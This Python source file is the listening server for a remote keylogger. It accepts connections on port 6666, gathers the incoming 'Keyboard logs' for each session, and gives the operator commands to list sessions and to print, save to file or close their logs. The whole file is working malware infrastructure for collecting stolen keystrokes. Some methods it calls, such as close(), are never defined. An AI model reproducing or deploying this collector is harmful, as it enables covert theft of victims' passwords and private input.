import socket
import threading
import sys
import os
from datetime import datetime
from colorama import Fore, Style


def connection_gateway(listener_socket, session_manager):
    while True:
        (clientConnected, clientAddress) = listener_socket.accept()
        print(f"\n[NEW] > Connection from {clientAddress[0]}:{clientAddress[1]}")
        new_connection = session_manager.add(clientConnected, clientAddress)
        new_connection_thread = StoppableThread(target=new_connection.start)
        new_connection_thread.daemon = True
        new_connection_thread.start()


class StoppableThread(threading.Thread):
    def __init__(self, *args, **kwargs):
        super(StoppableThread, self).__init__(*args, **kwargs)
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()


class ClientConnection:
    def __init__(self, sid, client, address):
        self.sid = sid
        self.address = address[0]
        self.port = address[1]
        self.client = client
        self.logs = ""
        self.closed = False

    def save_logs(self, hush: bool = False):
        file_name = "log-{}_{}.txt".format(self.address, datetime.now().strftime("%m-%d-%Y_%H-%M-%S"))
        __pwd__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
        path = os.path.join(__pwd__, "logs/", file_name)
        if not os.path.exists(os.path.join(__pwd__, "logs/")):
            os.mkdir("logs")
        with open(path, "w") as log:
            try:
                log.write(f"\nKeyboard logs from - Session {self.sid} ({self.address}:{self.port})\n"
                          f"--------------------------------\n" + self.logs)
            except:
                if not hush:
                    print("[ERROR] > Failed to write logs for Session {} to log file".format(self.sid))
                return False
            else:
                if not hush:
                    print("[SUCCESS] > Logs written to file {}".format(file_name))
                return True

    def print_logs(self):
        print(f"\nKeyboard logs from - Session {self.sid} ({self.address}:{self.port})\n"
              f"--------------------------------\n" + self.logs)

    def start(self):
        while not self.closed:
            try:
                data = self.client.recv(1024)
                if data:
                    self.logs += data.decode()
            except:
                self.close()
                print(f"\nSession {self.sid} disconnect ({self.address}:{self.port}) - Logs Saved")
                return False

    def kill(self):
        session_manager.remove(self)
        self.client.close()
        self.save_logs(True)
        self.closed = True


class SessionManager:
    def __init__(self):
        self.next_sid = 1
        self.connections = {}

    def add(self, client_object, client_address):
        new_connection = ClientConnection(self.next_sid, client_object, client_address)
        self.connections[self.next_sid] = new_connection
        self.next_sid += 1
        return new_connection

    def remove(self, connection: ClientConnection):
        del self.connections[connection.sid]

    def get_sessions(self):
        sessions = [f" {c.sid} | {c.address}:{c.port} | {len(c.logs)}" for c in self.connections.values()]
        if len(sessions) > 0:
            print("\n".join(sessions))
        else:
            print("There are no open sessions.")

    def close_session(self, session_id):
        session = self.connections.get(session_id, None)
        if session:
            session.close()
        else:
            print(f"[ERROR] > Session {session_id} does not exist.")


    def logs(self, session_id, action: int):
        session = self.connections.get(session_id, None)
        if session:
            if action == 0:
                session.print_logs()
            elif action == 1:
                session.save_logs()
        else:
            print(f"[ERROR] > Session {session_id} does not exist.")


class ListenerServer:
    def __init__(self, address: str, port: int, session_manager: SessionManager):
        self.address = address
        self.port = port
        self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.session_manager = session_manager

        self.options = {
            "sessions": "List all active sessions.",
            "logs <session_id>": "Display the logs of specified session.",
            "save <session_id>": "Save the logs of specified session to a file",
            "help": "Display this list.",
            "exit": "Shutdown listener server and close all sessions."
        }

    def start(self):
        self.listener_socket.bind((self.address, self.port))
        self.listener_socket.listen()

        connection_handler_thread = StoppableThread(target=connection_gateway,
                                                    args=[self.listener_socket, self.session_manager])
        connection_handler_thread.daemon = True
        connection_handler_thread.start()

        while True:
            framework = input(
                Style.BRIGHT + Fore.YELLOW + "\033[4mServer\033[0m" + Style.BRIGHT + Fore.RED + ":> " + Fore.WHITE)
            params = framework.lower().split()

            if len(params) > 0:

                # list all active sessions
                if params[0] == "sessions":
                    self.session_manager.get_sessions()

                # get and save logs of specified session
                elif params[0] == "logs" and len(params) > 1:
                    try:
                        self.session_manager.logs(int(params[1]), 0)
                    except ValueError:
                        print(f"[ERROR] > Session ID must be a number")

                # save key-logs to a file
                elif params[0] in ("save", "output", "export") and len(params) > 1:
                    try:
                        self.session_manager.logs(int(params[1]), 1)
                    except ValueError:
                        print(f"[ERROR] > Session ID must be a number")

                # close a specified connection
                elif params[0] == "close" and len(params) > 1:
                    try:
                        self.session_manager.close_session(int(params[1]))
                    except ValueError:
                        print(f"[ERROR] > Session ID must be a number")

                # display help list
                elif params[0] == "help":
                    max_len = max(map(len, self.options))
                    print("\n".join(
                        [f" {' ' * (max_len - len(key)) + key} | {value}" for key, value in self.options.items()]))

                # close server
                elif params[0] == "exit":
                    connection_handler_thread.stop()
                    sys.exit("[EXIT] > Server Stopped")


def main_server():
    global session_manager
    session_manager = SessionManager()

    server = ListenerServer("0.0.0.0", 6666, session_manager)
    server.start()


if __name__ == "__main__":
    main_server()
